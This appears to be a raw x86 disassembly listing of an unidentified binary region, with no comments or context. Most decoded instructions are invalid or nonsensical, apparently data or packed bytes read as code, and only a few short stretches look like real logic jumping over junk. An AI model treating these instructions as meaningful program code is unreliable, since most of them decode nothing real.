  40dd1d:	xor    BYTE PTR [esi],0x43
  40dd20:	jnp    0x40dceb
  40dd22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd23:	aaa    
  40dd24:	cld    
  40dd25:	ret    0xad7b
  40dd28:	jnp    0x40dd59
  40dd2a:	int3   
  40dd2b:	xchg   esi,eax
  40dd2c:	out    0x0,al
  40dd2e:	mov    ebp,DWORD PTR [ebx-0x3d]
  40dd31:	jne    0x40dd26
  40dd33:	jg     0x40dce9
  40dd35:	xchg   esp,eax
  40dd36:	aaa    
  40dd37:	retf   
  40dd38:	imul   edx,DWORD PTR [edi+0x7704ca26],0x32
  40dd3f:	fs inc eax
  40dd41:	(bad)  
  40dd42:	hlt    
  40dd43:	imul   ecx,DWORD PTR [ebx],0xb516bb57
  40dd49:	mov    ss,WORD PTR [edx]
  40dd4b:	aas    
  40dd4c:	bound  eax,QWORD PTR [eax]
  40dd4e:	inc    edi
  40dd4f:	ror    DWORD PTR [ecx-0x6fb8a984],0xdf
  40dd56:	outs   dx,BYTE PTR ds:[esi]
  40dd57:	jg     0x40dd9a
  40dd59:	mov    eax,ds:0xbffee53b
  40dd5e:	in     eax,0xa6
  40dd60:	adc    al,0x3f
  40dd62:	mov    ds:0xc5f1c14a,eax
  40dd67:	std    
  40dd68:	in     al,0xac
  40dd6a:	rol    BYTE PTR [ecx-0x72],0x68
  40dd6e:	test   al,0xdb
  40dd70:	jg     0x40dd31
  40dd72:	sbb    eax,0x3ee41c00
  40dd77:	inc    eax
  40dd78:	addr16 add eax,0xd2aa47ac
  40dd7e:	jne    0x40dd98
  40dd80:	push   ss
  40dd81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd82:	xor    al,0xf3
  40dd84:	mov    edx,0x248cfa27
  40dd89:	cmp    DWORD PTR [ecx-0x5d340ad3],edx
  40dd8f:	imul   ecx,DWORD PTR [eax+0x3e9c8855],0x36
  40dd96:	xlat   BYTE PTR ds:[ebx]
  40dd97:	mov    ebx,0x2c30d8d7
  40dd9c:	push   0xffffff8c
  40dd9e:	sbb    eax,0x40e16808
  40dda3:	pop    esp
  40dda4:	xchg   edx,eax
  40dda5:	add    eax,0x40e4d3e7
  40ddaa:	or     eax,eax
  40ddac:	ror    esp,1
  40ddae:	sti    
  40ddaf:	stos   DWORD PTR es:[edi],eax
  40ddb0:	test   eax,0x6c47c7ae
  40ddb5:	cwde   
  40ddb6:	or     eax,0xebc662cb
  40ddbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddbc:	sub    DWORD PTR [ecx-0x9],0xe328f2cf
  40ddc3:	adc    ecx,DWORD PTR [eax+0x59ead563]
  40ddc9:	rcr    BYTE PTR [ecx],1
  40ddcb:	and    DWORD PTR [ebx],0x11
  40ddce:	add    ch,bh
  40ddd0:	fs ret 
  40ddd2:	jbe    0x40dd97
  40ddd4:	inc    edi
  40ddd5:	out    0x18,al
  40ddd7:	push   esp
  40ddd8:	sahf   
  40ddd9:	into   
  40ddda:	mov    DWORD PTR [esi-0x71],ecx
  40dddd:	jge    0x40dd91
  40dddf:	arpl   dx,bp
  40dde1:	dec    esp
  40dde2:	dec    eax
  40dde3:	jecxz  0x40dd67
  40dde5:	push   0xffffffb4
  40dde7:	ss inc esp
  40dde9:	mov    esi,0x2a4a547d
  40ddee:	xchg   BYTE PTR [edx-0x49],al
  40ddf1:	cli    
  40ddf2:	clc    
  40ddf3:	lds    ecx,FWORD PTR [esi-0x19c6212a]
  40ddf9:	mov    bl,0xc5
  40ddfb:	xchg   edx,eax
  40ddfc:	(bad)  
  40ddfd:	dec    ebp
  40ddfe:	jl     0x40de69
  40de00:	inc    edi
  40de01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de02:	dec    ecx
  40de03:	(bad)  
  40de04:	and    esp,DWORD PTR [edi]
  40de06:	(bad)  [edx+0x62]
  40de09:	dec    eax
  40de0a:	mov    bh,0x3d
  40de0c:	sub    ebp,DWORD PTR [edx]
  40de0e:	cdq    
  40de0f:	push   es
  40de10:	sbb    al,0x43
  40de12:	sbb    BYTE PTR [esi],0x8c
  40de15:	jecxz  0x40ddde
  40de17:	inc    esi
  40de18:	aad    0x9a
  40de1a:	sahf   
  40de1b:	pop    ebp
  40de1c:	test   eax,0x492f300c
  40de21:	sub    eax,0xac0499f2
  40de26:	and    BYTE PTR [esi-0x6522f6d3],ah
  40de2c:	enter  0x8ca7,0xab
  40de30:	out    0x9b,al
  40de32:	pop    ebx
  40de33:	dec    ebp
  40de34:	shl    dh,0x1a
  40de37:	rcl    BYTE PTR [ecx-0x5f],0xc
  40de3b:	icebp  
  40de3c:	jmp    0xc37fcc6c
  40de41:	or     eax,0x3ee97a41
  40de46:	test   eax,0x1c7b5926
  40de4b:	sbb    ch,ah
  40de4d:	scas   eax,DWORD PTR es:[edi]
  40de4e:	mov    bl,0x2c
  40de50:	pop    ds
  40de51:	nop
  40de52:	outs   dx,DWORD PTR ds:[esi]
  40de53:	or     al,0x52
  40de55:	clc    
  40de56:	outs   dx,BYTE PTR ds:[esi]
  40de57:	sub    BYTE PTR [esi-0x97444e],cl
  40de5d:	repnz ins DWORD PTR es:[edi],dx
  40de5f:	mov    ds:0x6a123b7c,al
  40de64:	(bad)  
  40de65:	xchg   ecx,eax
  40de66:	or     ah,cl
  40de68:	push   cs
  40de69:	mov    ebx,ebx
  40de6b:	xor    eax,0xdc026937
  40de70:	hlt    
  40de71:	xor    eax,0x513cd4ba
  40de76:	dec    esp
  40de77:	cmp    al,BYTE PTR [esi+0x2cd83357]
  40de7d:	jae    0x40de7f
  40de7f:	aad    0x5c
  40de81:	xchg   esi,eax
  40de82:	mov    esi,0x6c0265da
  40de87:	loope  0x40de93
  40de89:	ins    BYTE PTR es:[edi],dx
  40de8a:	mov    eax,ds:0xf636beca
  40de8f:	fcmovnb st,st(5)
  40de91:	jle    0x40dee4
  40de93:	sub    ebx,DWORD PTR [ebx*8-0x258604b2]
  40de9a:	stos   DWORD PTR es:[edi],eax
  40de9b:	es jno 0x40ded0
  40de9e:	add    al,0x46
  40dea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dea1:	sub    eax,DWORD PTR [esi]
  40dea3:	fdiv   st,st(4)
  40dea5:	xor    BYTE PTR [ecx-0x1c],ch
  40dea8:	sti    
  40dea9:	loope  0x40dee0
  40deab:	cs adc eax,0x956ceb2b
  40deb1:	fild   WORD PTR ds:0xa0728db7
  40deb7:	adc    bl,BYTE PTR [eax+0x9]
  40deba:	push   ebx
  40debb:	dec    esp
  40debc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40debd:	(bad)  
  40debf:	push   esi
  40dec0:	dec    edx
  40dec1:	dec    esp
  40dec2:	ja     0x40de61
  40dec4:	out    dx,al
  40dec5:	sbb    al,0x90
  40dec7:	add    BYTE PTR [esi-0x3dc5f566],dl
  40decd:	pop    esi
  40dece:	push   es
  40decf:	push   ebx
  40ded0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ded1:	out    dx,eax
  40ded2:	mov    edx,0x88cf9eb9
  40ded7:	pop    esp
  40ded8:	jge    0x40de7e
  40deda:	call   0xb805:0xfa9afb04
  40dee1:	cmp    edx,DWORD PTR [edi-0x355e042a]
  40dee7:	daa    
  40dee8:	popf   
  40dee9:	icebp  
  40deea:	adc    BYTE PTR [edi+0x52f7af91],bh
  40def0:	sub    BYTE PTR [edi],cl
  40def2:	add    al,bl
  40def4:	pop    ecx
  40def5:	das    
  40def6:	in     al,dx
  40def7:	jg     0x40df1f
  40def9:	jmp    0x9e99:0xc1f2fecc
  40df00:	or     DWORD PTR [ebp+ecx*2+0x15],0x51
  40df05:	cwde   
  40df06:	repz cmp al,0xf4
  40df09:	jge    0x40df81
  40df0b:	and    eax,0x566f8a74
  40df10:	or     esi,ebx
  40df12:	push   cs
  40df13:	sub    eax,0x82e8162a
  40df18:	out    dx,al
  40df19:	sub    al,0x23
  40df1b:	das    
  40df1c:	fidiv  DWORD PTR [edx]
  40df1e:	test   al,0x98
  40df20:	and    ebx,ebx
  40df22:	or     edx,DWORD PTR ds:0x58a885ff
  40df28:	jmp    0x40df3d
  40df2a:	ficomp WORD PTR [eax]
  40df2c:	leave  
  40df2d:	mov    ch,0x7a
  40df2f:	sar    DWORD PTR [ebx-0x51],cl
  40df32:	je     0x40df42
  40df34:	scas   eax,DWORD PTR es:[edi]
  40df35:	call   0x56b6f1
  40df3a:	xchg   BYTE PTR [ecx],ch
  40df3c:	add    eax,0xf2387e61
  40df41:	enter  0xccce,0xb2
  40df45:	ss sub ecx,edx
  40df48:	mov    ecx,0x5824d35b
  40df4d:	icebp  
  40df4e:	mov    eax,0xd4d9d389
  40df53:	jmp    FWORD PTR [ecx-0x6f]
  40df56:	cmp    DWORD PTR [eax+0x54725449],esi
  40df5c:	inc    edx
  40df5d:	shr    BYTE PTR [ebx],cl
  40df5f:	cmc    
  40df60:	inc    edi
  40df61:	cmc    
  40df62:	test   ch,ah
  40df64:	movaps XMMWORD PTR [eax],xmm1
  40df67:	les    edx,FWORD PTR [ecx+0x7f6702e0]
  40df6d:	xor    DWORD PTR [esp+esi*1],0xd099f2be
  40df74:	loop   0x40df05
  40df76:	xchg   esi,eax
  40df77:	lds    esi,FWORD PTR [ebx-0x10]
  40df7a:	xor    DWORD PTR [ebx+0x37e55ae6],ecx
  40df80:	push   ss
  40df81:	jae    0x40dfe0
  40df83:	mov    ebp,0xea8544dd
  40df88:	adc    BYTE PTR [ecx-0x6],0x4b
  40df8c:	outs   dx,DWORD PTR ds:[esi]
  40df8d:	cs lahf 
  40df8f:	push   ebx
  40df90:	push   esp
  40df91:	inc    ebx
  40df92:	jmp    0xb27c:0x6a85f199
  40df99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df9a:	add    ebx,DWORD PTR [esi-0x21c3d1ca]
  40dfa0:	ret    
  40dfa1:	mov    dl,0x3c
  40dfa3:	xchg   ecx,eax
  40dfa4:	fimul  DWORD PTR [edi+0x615f145a]
  40dfaa:	adc    edi,eax
  40dfac:	out    0xe3,al
  40dfae:	push   ebx
  40dfaf:	mov    ecx,0x4844a557
  40dfb4:	push   esi
  40dfb5:	repnz mov esi,0x6f5d839c
  40dfbb:	push   edx
  40dfbc:	mov    bh,0x8f
  40dfbe:	fcomi  st,st(5)
  40dfc0:	out    0x9d,al
  40dfc2:	jb     0x40e043
  40dfc4:	push   eax
  40dfc5:	or     al,0xee
  40dfc7:	loopne 0x40e005
  40dfc9:	push   es
  40dfca:	pop    eax
  40dfcb:	in     al,0x45
  40dfcd:	pop    edx
  40dfce:	cs nop
  40dfd0:	mov    ecx,0x21c8ca5e
  40dfd5:	repnz sub DWORD PTR [esi],ebp
  40dfd8:	xchg   ch,ch
  40dfda:	jp     0x40dfe0
  40dfdc:	jge    0x40e014
  40dfde:	data16 jbe 0x40e022
  40dfe1:	stos   DWORD PTR es:[edi],eax
  40dfe2:	sbb    al,0xb0
  40dfe4:	pop    ebx
  40dfe5:	jle    0x40df73
  40dfe7:	aaa    
  40dfe8:	adc    eax,0xf8a2233f
  40dfed:	or     DWORD PTR [ecx],esp
  40dfef:	daa    
  40dff0:	mov    cs,WORD PTR [ebx+0x55e68da8]
  40dff6:	fiadd  WORD PTR [ebx]
  40dff8:	mov    al,ds:0x517b26c7
  40dffd:	sbb    al,0x54
  40dfff:	inc    DWORD PTR [ebx+0x16b59874]
  40e005:	push   ebp
  40e006:	mov    eax,ds:0x15d16f61
  40e00b:	(bad)  
  40e00c:	jecxz  0x40e068
  40e00e:	or     eax,0x9c10ee08
  40e013:	pop    es
  40e014:	pusha  
  40e015:	jg     0x40dfc7
  40e017:	xchg   esp,eax
  40e018:	or     eax,0xe65b1a5f
  40e01d:	add    al,0x53
  40e01f:	dec    esi
  40e020:	add    eax,0x9ba95d5f
  40e025:	mov    esi,DWORD PTR [edx+0x30e5d956]
  40e02b:	and    al,BYTE PTR [edx+eiz*4+0x6e]
  40e02f:	pop    edi
  40e030:	xor    BYTE PTR [ebp+0x31],0x46
  40e034:	mov    ch,0x3b
  40e036:	ins    DWORD PTR es:[edi],dx
  40e037:	mov    ds:0xfa00cc57,al
  40e03c:	in     al,dx
  40e03d:	and    ecx,DWORD PTR [esi-0x20ea99e7]
  40e043:	mov    edi,0x9875a948
  40e048:	in     eax,dx
  40e049:	mov    bl,0x5
  40e04b:	inc    edx
  40e04c:	sbb    ebx,DWORD PTR [edi]
  40e04e:	rdpmc  
  40e050:	inc    DWORD PTR [ebx]
  40e052:	retf   
  40e053:	mov    DWORD PTR [ebp-0x20],ecx
  40e056:	mov    eax,ds:0x434396
  40e05b:	mov    eax,DWORD PTR [ebp-0x20]
  40e05e:	jmp    0x40e452
  40e063:	xlat   BYTE PTR ds:[ebx]
  40e064:	frstor [esi-0xeac49ad]
  40e06a:	pop    ecx
  40e06b:	test   DWORD PTR [ecx],0x4c67baa7
  40e071:	shr    BYTE PTR [ecx],cl
  40e073:	stc    
  40e074:	xchg   edx,eax
  40e075:	jo     0x40e0e7
  40e077:	dec    ecx
  40e078:	jge    0x40e0ea
  40e07a:	jo     0x40e0f6
  40e07c:	into   
  40e07d:	imul   eax,DWORD PTR [ebx-0x479353fc],0x86aec385
  40e087:	jle    0x40e05e
  40e089:	xor    BYTE PTR [eax+0x3c],cl
  40e08c:	jl     0x40e08c
  40e08e:	xchg   BYTE PTR [edi+0x3dc026bc],dl
  40e094:	inc    edi
  40e095:	mov    dh,0x73
  40e097:	retf   
  40e098:	retf   0xd4ce
  40e09b:	jne    0x40e034
  40e09d:	dec    ecx
  40e09e:	cmp    ah,ah
  40e0a0:	inc    DWORD PTR [ebx+0x9a3c275]
  40e0a6:	jp     0x40e0d2
  40e0a8:	fs jmp 0xbf90:0x8eb40083
  40e0b0:	push   ebp
  40e0b1:	sub    BYTE PTR [esi-0x30],ah
  40e0b4:	ret    
  40e0b5:	test   eax,0xb9564c79
  40e0ba:	push   cs
  40e0bb:	leave  
  40e0bc:	icebp  
  40e0bd:	mov    ch,0xdf
  40e0bf:	jge    0x40e137
  40e0c1:	adc    DWORD PTR [ecx-0x533f9baf],edx
  40e0c7:	int    0xc5
  40e0c9:	aam    0x62
  40e0cb:	scas   eax,DWORD PTR es:[edi]
  40e0cc:	popa   
  40e0cd:	mov    edi,0x98e89f65
  40e0d2:	xor    BYTE PTR [edi+0x1b0d2e6e],al
  40e0d8:	fld    QWORD PTR [ebp-0x3c]
  40e0db:	add    eax,0x179943dd
  40e0e0:	neg    DWORD PTR [esi+0x4a]
  40e0e3:	mov    al,0x97
  40e0e5:	sbb    BYTE PTR [eiz*8-0x2c7b8d78],dl
  40e0ec:	jmp    0x21e4cc77
  40e0f1:	push   ebx
  40e0f2:	adc    al,0x12
  40e0f4:	imul   edi,DWORD PTR [ebx-0x5],0xf3588310
  40e0fb:	cld    
  40e0fc:	pop    esp
  40e0fd:	adc    esi,eax
  40e0ff:	mov    edx,0xa507d24d
  40e104:	(bad)  
  40e105:	xlat   BYTE PTR ds:[ebx]
  40e106:	mov    ds:0x3021acb2,al
  40e10b:	xchg   BYTE PTR [eax+0x5c],ch
  40e10e:	jns    0x40e12b
  40e110:	jne    0x40e190
  40e112:	push   0x78
  40e114:	jmp    0x8a7:0x171c4ccd
  40e11b:	and    esp,0xffffffc6
  40e11e:	in     eax,0xee
  40e120:	mov    eax,ds:0x7230abdc
  40e125:	xchg   BYTE PTR [eax],ah
  40e127:	inc    edx
  40e128:	ret    0x135c
  40e12b:	(bad)
  40e12e:	ja     0x40e12b
  40e130:	sub    BYTE PTR [ecx-0x46],0xf9
  40e134:	sub    al,0xda
  40e136:	popf   
  40e137:	loope  0x40e1ab
  40e139:	jle    0x40e1a6
  40e13b:	jecxz  0x40e161
  40e13d:	pushf  
  40e13e:	or     edx,DWORD PTR [eax]
  40e140:	pop    edi
  40e141:	mov    DWORD PTR [esi+0x63],esp
  40e144:	stc    
  40e145:	dec    edi
  40e146:	and    al,0x40
  40e148:	xor    al,0x87
  40e14a:	ret    
  40e14b:	ret    
  40e14c:	imul   esp,DWORD PTR [edx-0x21],0x74
  40e150:	aaa    
  40e151:	sbb    DWORD PTR [eax+0x46],edx
  40e154:	dec    esp
  40e155:	das    
  40e156:	loope  0x40e146
  40e158:	repnz sbb eax,0x5e9fd75d
  40e15e:	leave  
  40e15f:	ins    BYTE PTR es:[edi],dx
  40e160:	repz in eax,0x92
  40e163:	je     0x40e1bc
  40e165:	(bad)  
  40e166:	js     0x40e144
  40e168:	inc    ebp
  40e169:	jmp    0x40e0ec
  40e16b:	add    eax,0xfbe37f34
  40e170:	sti    
  40e171:	lock mov ch,0x4c
  40e174:	lea    edi,[ebx+0x16]
  40e177:	fsub   DWORD PTR [esi+0x8]
  40e17a:	cmp    dl,bh
  40e17c:	or     al,0x6f
  40e17e:	sub    al,0x7f
  40e180:	and    BYTE PTR [esi-0x57],dl
  40e183:	push   ds
  40e184:	pop    es
  40e185:	add    ebx,DWORD PTR [edx]
  40e187:	pop    ss
  40e188:	sbb    eax,0xb23de94
  40e18d:	xchg   esi,eax
  40e18e:	cmp    eax,0xaf9dfc3d
  40e193:	out    0x2a,eax
  40e195:	mov    ebp,DWORD PTR [esi]
  40e197:	mov    edi,0x1d46a960
  40e19c:	jmp    0x40e211
  40e19e:	popf   
  40e19f:	cs cmp eax,0xbfcf3a46
  40e1a5:	jo     0x40e157
  40e1a7:	adc    BYTE PTR [ebp+0x2288cc1d],cl
  40e1ad:	push   es
  40e1ae:	bound  ebx,QWORD PTR [eax-0x74]
  40e1b1:	lea    ebp,[ecx-0x3230b8e2]
  40e1b7:	pop    edi
  40e1b8:	jae    0x40e1c7
  40e1ba:	aas    
  40e1bb:	adc    ecx,ebx
  40e1bd:	jecxz  0x40e183
  40e1bf:	push   esi
  40e1c0:	fcomp  DWORD PTR [ecx-0x3f]
  40e1c3:	cmp    esp,edx
  40e1c5:	(bad)  
  40e1c6:	js     0x40e205
  40e1c8:	push   0xffffffd9
  40e1ca:	nop
  40e1cb:	fisubr DWORD PTR [ecx+0x1e0fabd6]
  40e1d1:	sahf   
  40e1d2:	scas   al,BYTE PTR es:[di]
  40e1d4:	and    eax,edi
  40e1d6:	xor    BYTE PTR [edx-0x57],bh
  40e1d9:	xchg   BYTE PTR [ebx-0x1c],dl
  40e1dc:	frstor [edx-0x44]
  40e1df:	mov    ch,0xaf
  40e1e1:	mov    ecx,0x3293a38b
  40e1e6:	aaa    
  40e1e7:	adc    eax,0xcda3a2c
  40e1ec:	add    eax,0xd9495b54
  40e1f1:	jecxz  0x40e179
  40e1f3:	mov    ebp,0x53a8d9fe
  40e1f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1f9:	je     0x40e1e9
  40e1fb:	outs   dx,BYTE PTR ds:[esi]
  40e1fc:	div    BYTE PTR [ebx+edi*8-0xfe622a0]
  40e203:	adc    eax,0x9653501d
  40e208:	call   0xa8eb5c
  40e20d:	push   es
  40e20e:	inc    eax
  40e20f:	dec    eax
  40e210:	out    dx,eax
  40e211:	cld    
  40e212:	(bad)  
  40e213:	dec    edx
  40e214:	repnz push es
  40e216:	pop    ds
  40e217:	pop    esp
  40e218:	stos   BYTE PTR es:[edi],al
  40e219:	dec    eax
  40e21a:	pop    ebp
  40e21b:	pop    ebx
  40e21c:	fist   DWORD PTR ds:0xed477591
  40e222:	push   esi
  40e223:	or     ah,cl
  40e225:	or     al,0xd3
  40e227:	arpl   WORD PTR [ebp+0x21dd0388],bx
  40e22d:	dec    ebp
  40e22e:	outs   dx,BYTE PTR ds:[esi]
  40e22f:	mov    bl,0x95
  40e231:	fisubr DWORD PTR [edi-0x25e9a807]
  40e237:	imul   ebp,DWORD PTR ds:0x8bb3fff8,0x740cd7b3
  40e241:	or     al,0xdf
  40e243:	stc    
  40e244:	jmp    0xb8b1746c
  40e249:	leave  
  40e24a:	retfw  0xcd1f
  40e24e:	int3   
  40e24f:	idiv   DWORD PTR [esi+0x362fd356]
  40e255:	aam    0xd1
  40e257:	daa    
  40e258:	mov    edx,0xfbb087c2
  40e25d:	inc    esp
  40e25e:	dec    BYTE PTR [eax+eax*8+0x5c]
  40e262:	scas   eax,DWORD PTR es:[edi]
  40e263:	fimul  DWORD PTR [ecx+0x31]
  40e266:	mov    ah,BYTE PTR [ecx+0x7cca982d]
  40e26c:	or     esp,DWORD PTR [edi]
  40e26e:	xchg   cl,ch
  40e270:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e271:	jbe    0x40e264
  40e273:	ret    0x8612
  40e276:	push   esp
  40e277:	js     0x40e222
  40e279:	je     0x40e273
  40e27b:	retw   
  40e27d:	hlt    
  40e27e:	mov    ecx,0xd3f74822
  40e283:	std    
  40e284:	jp     0x40e2e8
  40e286:	inc    edi
  40e287:	lds    ebp,FWORD PTR [ebx-0x1a82bb07]
  40e28d:	rol    BYTE PTR [ebp+ebx*4+0x5161ff04],1
  40e294:	out    dx,eax
  40e295:	jns    0x40e291
  40e297:	mov    dh,0xfb
  40e299:	rol    BYTE PTR [eax-0x80],cl
  40e29c:	call   0x9c6a:0x4cbbf67a
  40e2a3:	bound  ebx,QWORD PTR [edx+ebx*8-0x4152062a]
  40e2aa:	test   eax,0x3cc4e3c
  40e2af:	push   edx
  40e2b0:	leave  
  40e2b1:	test   BYTE PTR [ebp+0x52e16cc0],bh
  40e2b7:	arpl   WORD PTR ds:[ebx+ebp*2],si
  40e2bb:	lahf   
  40e2bc:	jnp    0x40e28e
  40e2be:	or     ch,BYTE PTR [esi]
  40e2c0:	or     eax,0x397a66f1
  40e2c5:	inc    ebx
  40e2c6:	jno    0x40e26d
  40e2c8:	and    edx,esi
  40e2ca:	das    
  40e2cb:	gs test eax,0x7fb26314
  40e2d1:	sar    BYTE PTR ds:0xca647df2,1
  40e2d7:	mov    dh,0x79
  40e2d9:	jmp    0xc1c2e9a2
  40e2de:	cmc    
  40e2df:	adc    al,0x79
  40e2e1:	in     eax,0x10
  40e2e3:	rol    DWORD PTR [ecx+0xbf6d8a6],1
  40e2e9:	mov    ebx,0xd30ce0e9
  40e2ee:	fucomip st,st(7)
  40e2f0:	inc    edi
  40e2f1:	ret    0xa881
  40e2f4:	out    0x56,eax
  40e2f6:	push   esp
  40e2f7:	fisubr WORD PTR [edx+esi*4+0x2b]
  40e2fb:	sbb    eax,0xadf370ba
  40e300:	imul   ebp,DWORD PTR [edi-0x67],0xffffffb6
  40e304:	xchg   edx,eax
  40e305:	arpl   WORD PTR [ecx+0x1f],dx
  40e308:	stc    
  40e309:	push   eax
  40e30a:	cmc    
  40e30b:	mov    dl,0xa8
  40e30d:	lds    ecx,FWORD PTR [eax]
  40e30f:	ret    
  40e310:	jmp    0x40e8a96d
  40e315:	and    eax,edi
  40e317:	adc    eax,0xdbdef180
  40e31c:	rol    BYTE PTR [ebx-0x37],cl
  40e31f:	out    0x70,eax
  40e321:	(bad)  
  40e323:	int3   
  40e324:	cdq    
  40e325:	mov    ch,BYTE PTR [ebx]
  40e327:	or     ecx,DWORD PTR [ecx+0x46eebca5]
  40e32d:	ds mov edi,0x18e300dd
  40e333:	stos   DWORD PTR es:[edi],eax
  40e334:	test   al,0xf8
  40e336:	or     eax,0x3d498faa
  40e33b:	mov    al,ds:0xad3f5790
  40e340:	fistp  DWORD PTR [esi+0x67]
  40e343:	inc    esi
  40e344:	dec    esi
  40e345:	mov    DWORD PTR [edx+ebp*1],esi
  40e348:	hlt    
  40e349:	adc    ebx,esi
  40e34b:	jo     0x40e395
  40e34d:	arpl   WORD PTR [edx+ebp*1+0x3ddb40c8],sp
  40e354:	ins    BYTE PTR es:[edi],dx
  40e355:	pop    eax
  40e356:	sub    BYTE PTR [ecx+0x6e965167],dl
  40e35c:	add    cl,BYTE PTR [ecx+0xf]
  40e35f:	ins    BYTE PTR es:[edi],dx
  40e360:	aaa    
  40e361:	retf   
  40e362:	cli    
  40e363:	mov    ds:0x5256af18,eax
  40e368:	ss (bad) 
  40e36a:	adc    eax,0x7f3b184e
  40e36f:	adc    ebp,DWORD PTR [ebx+0x38]
  40e372:	xchg   esp,eax
  40e373:	stos   BYTE PTR es:[edi],al
  40e374:	loope  0x40e3df
  40e376:	mov    ds:0x263f87f3,eax
  40e37b:	mov    cl,0x64
  40e37d:	jno    0x40e31b
  40e37f:	out    dx,eax
  40e380:	add    al,0xc3
  40e382:	mov    WORD PTR [eax-0x10b16cb5],ds
  40e388:	push   ecx
  40e389:	scas   eax,DWORD PTR es:[edi]
  40e38a:	pop    edx
  40e38b:	xor    esp,ebp
  40e38d:	lds    esi,FWORD PTR [ebp-0x1b]
  40e390:	xchg   edi,eax
  40e391:	call   esi
  40e393:	pop    esp
  40e394:	pop    ecx
  40e395:	jle    0x40e330
  40e397:	aaa    
  40e398:	jae    0x40e34b
  40e39a:	mov    sp,0x992f
  40e39e:	jb     0x40e346
  40e3a0:	sbb    edi,DWORD PTR [edx+0xfd4d250]
  40e3a6:	shl    DWORD PTR ds:0xec86291d,1
  40e3ac:	pop    ds
  40e3ad:	inc    esi
  40e3ae:	cwde   
  40e3af:	pop    ds
  40e3b0:	ret    
  40e3b1:	xor    BYTE PTR [ecx],dl
  40e3b3:	jmp    0x40e38a
  40e3b5:	ret    0x927e
  40e3b8:	sub    al,BYTE PTR [esi+0x16d48966]
  40e3be:	cs stos DWORD PTR es:[edi],eax
  40e3c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3c1:	sbb    eax,0xc64190a4
  40e3c6:	jg     0x40e380
  40e3c8:	dec    ebp
  40e3c9:	aas    
  40e3ca:	dec    BYTE PTR [ebp+eiz*8-0x23]
  40e3ce:	ss ins BYTE PTR es:[edi],dx
  40e3d0:	and    al,0xc6
  40e3d2:	and    DWORD PTR [ebp-0x59ef97b4],edi
  40e3d8:	mov    edi,0x3157ffe4
  40e3dd:	pop    ecx
  40e3de:	rcl    BYTE PTR [ecx+0x53],0xed
  40e3e2:	addr16 pop edi
  40e3e4:	loopne 0x40e37c
  40e3e6:	push   cs
  40e3e7:	pop    es
  40e3e8:	ret    0x3c89
  40e3eb:	daa    
  40e3ec:	mov    ecx,0xbcdbde0d
  40e3f1:	ss loopne 0x40e433
  40e3f4:	or     ch,bh
  40e3f6:	mov    WORD PTR [ebp+0x762574df],gs
  40e3fc:	pop    esi
  40e3fd:	fcmove st,st(7)
  40e3ff:	loop   0x40e39d
  40e401:	add    eax,edi
  40e403:	inc    esi
  40e404:	or     eax,0x975c5de3
  40e409:	fidivr WORD PTR [ebx-0x4e]
  40e40d:	push   eax
  40e40e:	push   eax
  40e40f:	sbb    cl,al
  40e411:	fbld   TBYTE PTR [ebp-0x40be6c82]
  40e417:	loopne 0x40e418
  40e419:	int    0x1c
  40e41b:	mov    ss,WORD PTR [edx-0x530455ac]
  40e421:	retf   
  40e422:	out    dx,eax
  40e423:	sub    dh,BYTE PTR [ebp+0x199710a]
  40e429:	cdq    
  40e42a:	dec    ebx
  40e42b:	cmp    bl,bl
  40e42d:	adc    cl,BYTE PTR [ebx+eiz*4-0x26]
  40e431:	mov    esp,0xc622fb00
  40e436:	js     0x40e444
  40e438:	dec    edi
  40e439:	cmp    eax,edx
  40e43b:	push   ds
  40e43c:	mov    ecx,0xe9fed3a5
  40e441:	sub    ebp,DWORD PTR [edi]
  40e443:	arpl   WORD PTR [edi],si
  40e445:	loop   0x40e445
  40e447:	cmp    dh,BYTE PTR [edx]
  40e449:	fs in  al,dx
  40e44b:	ret    
  40e44c:	shl    BYTE PTR [edi-0x4ead9fdc],1
  40e452:	je     0x40fd56
  40e458:	movzx  eax,BYTE PTR ds:0x434382
  40e45f:	add    DWORD PTR ds:0x43441d,eax
  40e465:	mov    eax,DWORD PTR [ebp-0x4]
  40e468:	or     DWORD PTR ds:0x432dda,0x4326f0
  40e472:	xor    eax,0x7510855
  40e477:	add    eax,ebx
  40e479:	mov    DWORD PTR ds:0x432dc2,0x11db
  40e483:	cmp    edi,eax
  40e485:	jne    0x40f511
  40e48b:	push   DWORD PTR [ebp+0x8]
  40e48e:	adc    DWORD PTR ds:0x434392,0x8a5
  40e498:	call   0x40bc0c
  40e49d:	mov    DWORD PTR [ebp-0x20],eax
  40e4a0:	add    eax,0x438
  40e4a5:	mov    eax,DWORD PTR [ebp-0x4]
  40e4a8:	jmp    0x40e89c
  40e4ad:	fs pop ss
  40e4af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4b0:	sbb    BYTE PTR [ecx-0x4a],dh
  40e4b3:	popa   
  40e4b4:	push   ebx
  40e4b5:	neg    BYTE PTR [ecx+edx*1+0x19]
  40e4b9:	stc    
  40e4ba:	loop   0x40e477
  40e4bc:	lods   al,BYTE PTR ds:[esi]
  40e4bd:	rcr    BYTE PTR [esi+0x7d497070],cl
  40e4c3:	jo     0x40e535
  40e4c5:	outs   dx,BYTE PTR ds:[esi]
  40e4c6:	jp     0x40e4be
  40e4c8:	call   0x25b17ac5
  40e4cd:	rol    BYTE PTR [esi+edi*8+0x75],cl
  40e4d1:	mov    bh,0xc0
  40e4d3:	push   esp
  40e4d4:	and    DWORD PTR [edi],edi
  40e4d6:	sub    ah,BYTE PTR [esi]
  40e4d8:	jb     0x40e4f2
  40e4da:	or     eax,0xbbef125a
  40e4df:	jle    0x40e501
  40e4e1:	fldenv ss:[edx-0x6a]
  40e4e5:	add    ebx,DWORD PTR [edx]
  40e4e7:	jae    0x40e4e7
  40e4e9:	repz loopne 0x40e4d7
  40e4ec:	mov    esp,?
  40e4ee:	fld    TBYTE PTR [eax+0x1e5822cd]
